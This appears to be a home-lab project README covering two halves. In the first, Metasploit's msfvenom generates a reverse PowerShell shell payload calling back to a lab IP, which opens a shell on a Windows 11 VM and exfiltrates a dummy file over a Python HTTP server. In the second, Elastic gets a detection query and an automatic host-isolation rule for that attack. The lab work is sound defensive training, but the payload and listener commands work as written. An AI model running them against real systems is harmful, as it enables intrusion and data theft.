# Metasploit Reverse Shell

<br />

<p align="center">
<img src="https://images.crunchbase.com/image/upload/c_pad,f_auto,q_auto:eco,dpr_1/v1469039917/hodwdopd059vkn2k1b5a.png" height="30%" width="30%" alt="Detection Engineering Logo Team Ghost"/>
</p>


<h2>Description</h2>

In this section of the project, we will use Metasploit to spawn a reverse shell into our Windows 11 VM and exfiltrate some data. A reverse shell is a type of remote shell where the target machine initiates a connection to the attacker's machine, providing the attacker with control over the target.

</br>

<h2>Reverse Shell Attack</h2>

<h3>Attack Setup</h3>

The first step in setting up this attack is to open an HTTP server on our Parrot OS VM. To do this, open a terminal and enter the following command:

```Bash

python -m http.server 8000

```

<p align="center">
<img src="https://i.imgur.com/fcGQLBq.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Next, we will create a shell.bat file with code that will allow us to spawn a reverse shell. First, ensure that you are in the Desktop directory in your terminal, then execute the following command:

```Bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.0.0.5 lport=4689 > shell.bat
```

This command creates a reverse shell payload for Windows that uses PowerShell to connect back to our Parrot OS VM at IP address 10.0.0.5 on port 4689. The payload is saved as a batch file (shell.bat). When executed on our Windows 11 VM, this batch file will establish a reverse shell connection, giving us remote control over the Windows 11 VM.

<p align="center">
<img src="https://i.imgur.com/cSCiapf.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Afterward, we need to set up the multi-handler to listen for our payload and spawn the reverse shell. To do this, enter the following series of commands:

```Bash
sudo msfconsole
use exploit/multi/handler
set lhost 10.0.0.5
set lport 4689
```

<p align="center">
<img src="https://i.imgur.com/GNc4zvq.gif" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Finally, download the "Valuable Company Data - DO NOT HAXXX.txt" file from this page and place it inside the "Documents" folder of your Windows VM. This is the data we will exfiltrate with our reverse shell.

<p align="center">
<img src="https://i.imgur.com/aPdXRkk.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

We are now ready to execute the attack.

</br>

<h3>Attack Execution</h3>

o launch this attack, we will execute a .bat script named "Reverse Shell.bat" on our Windows 11 VM. First, on our Parrot OS VM, enter the command run inside the Metasploit console to start the multi-handler listening for the payload. Next, on our Windows 11 VM, execute the .bat file and wait until the reverse shell has spawned. Once the reverse shell is established, navigate to the directory containing the "Valuable Company Data - DO NOT HAXXX.txt" file.

<p align="center">
<img src="https://i.imgur.com/dlMLo38.gif" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Finally, we are going to exfiltrate the text file by creating an HTTP server using Python. Once the server is running, connect to it with a browser and download the file.

<p align="center">
<img src="https://i.imgur.com/3O8EvvB.gif" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

</br>

<h2>Reverse Shell Detection & Response</h2>


<h3>Reverse Shell Query</h3>

The approach we are going to take to create this query involves leveraging the shell script to our advantage. By examining the logs in Elastic and locating the PowerShell script that was executed, we can build our query based on this information. Here's what you'll find in the logs.

<p align="center">
<img src="https://i.imgur.com/d41awrK.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

The query that we are going to use for our detection rule is 
```sql
data_stream.dataset : "windows.sysmon_operational" and process.args : ("powershell" and "w" and "hidden" and "-nop")
```

-  data_stream.dataset : "windows.sysmon_operational" looks for logs that contains this dataset
-  process.args : ("powershell" and "w" and "hidden" and "-nop") looks for logs that contains these process arguments which are the first process arguments of reverse shell script

<p align="center">
<img src="https://i.imgur.com/J2807n5.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

</br>


<h3>Elastic Defend Installation</h3>

In Elastic, we can use an integration called "Elastic Defend" to set up a response action whenever an alert triggers. In this project, we will configure Elastic Defender to isolate our Windows VM when Elastic detects this reverse shell.

First, we need to install the Elastic Defend integration. To do this, go to your Elastic environment and use the search box at the top of the page to search for "Elastic Defend." Select the option, then click on the blue "Add Elastic Defend" button.

<p align="center">
<img src="https://i.imgur.com/cdFroIE.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Afterward, configure the integration settings by adding a name and description, selecting "Complete EDR (Endpoint Detection & Response)," and adding the integration to our existing Windows agent. Once that is done, proceed to install the integration.

<p align="center">
<img src="https://i.imgur.com/iI46FTK.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
<img src="https://i.imgur.com/sWbGFI3.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
<img src="https://i.imgur.com/NY9FmMd.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Finally, verify that the Windows VM has Elastic Defender by heading to "Security" in your Elastic environment and selecting the "Manage" option. Next, click on "Endpoints," and you should be taken to a page that lists your Windows VM.

<p align="center">
<img src="https://i.imgur.com/CDOobFd.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
<img src="https://i.imgur.com/qic8PnF.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Now, when we create our rule, we will add Elastic Defender as a rule action.

</br>


<h3>Reverse Shell Detection Rule</h3>


<b>Define Rule:</b>

Now that we have our query and Elastic Defender, we are ready to create our detection rule. First, copy the query. Then, click on the hamburger icon in the top-left corner of the page, scroll down to "Security," and select the "Rules" option. Next, click on "Detection Rules (SIEM)" and select "Create New Rule." Ensure that the "Custom Query" option is selected, then scroll down and paste our query. Next, scroll down to the "Suppress alerts by" option and enter "host.name." Select "Per time period" and set it to 5 minutes. This configuration will help reduce the noise generated by repetitive alerts by grouping similar alerts together.

<p align="center">
<img src="https://i.imgur.com/uLeJvqo.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
<img src="https://i.imgur.com/1BPXxte.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>

</p>

<b>About Rule:</b>

Next, we need to complete the "About Rule" section. Name the alert "Reverse Shell Detected - Machine Quarantined" and provide a description for the rule. Set the "Default severity" to "High." Then, click on "Advanced Settings." Scroll down to find "MITRE ATT&CK threats" and select the option for "Command & Control" as the tactic. For the technique, choose "Remote Access Tools".

<p align="center">
<img src="https://i.imgur.com/P1JFirJ.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
<img src="https://i.imgur.com/l5MWf6s.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Schedule Rule:</b>

After configuring the "About Rule" section, set the rule's duration by specifying that it should run every 5 minutes with a look-back time of 5 minutes. You can adjust these settings based on your needs and preferences.

<p align="center">
<img src="https://i.imgur.com/pdRFGaf.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Rule Actions:</b>

Finally, configure the response action for the rule. In this project, we will use Elastic Defender as the response action. To do this, select the "Elastic Defend" option and set the response action to "isolate." You can optionally add a comment for additional context. Once configured, click "Create & Enable Rule" to activate the rule. This setup will ensure that when the rule is triggered, Elastic Defender will automatically isolate the affected machine, providing an effective response to potential security incidents.

<p align="center">
<img src="https://i.imgur.com/qRRvyuB.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

<b>Results:</b>

Now that we’ve configured our rule, you can test it by attempting to spawn another reverse shell. When the rule is triggered, you can view the alert by navigating to "Security" and selecting the "Alerts" option. The alert should display with the specified details, showing that the rule has detected and responded to the reverse shell by isolating the affected machine.

<p align="center">
<img src="https://i.imgur.com/SzB7Tcr.png" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

Once Elastic triggers the alert, Elastic Defend will initiate the isolation of your Windows VM from the network. This action will prevent the VM from communicating with other devices, effectively containing any potential threat. The isolation process will be reflected in the Elastic Defend dashboard, where you will see the status of the Windows VM change to indicate that it has been quarantined.

<p align="center">
<img src="https://i.imgur.com/hfsLhi0.gif" height="150%" width="150%" alt="Detection Engineering Logo Team Ghost"/>
</p>

</br>

<b>Release Windows VM From Isolation</b>

To release your Windows VM from isolation, first head to Elastic Security and select the "Manage" option. Then, click on "Endpoints" to find your Windows VM in the list. On the right side of the Windows VM entry, you will see an "Actions" menu represented by three dots. Click on this menu and select "Release Host" from the dropdown options, then confirm your choice by clicking "Confirm." After initiating the release process, wait for the Windows VM to be restored to the network. To ensure that the VM has been successfully reconnected, verify the connection by pinging the Ubuntu VM on your internal network.

<p align="center">
<img src="https://i.imgur.com/kCLKdX1.gif" height="100%" width="100%" alt="Detection Engineering Logo Team Ghost"/>
</p>

</br>

<b>Metasploit Reverse Shell & Elastic Defend Complete!</b>

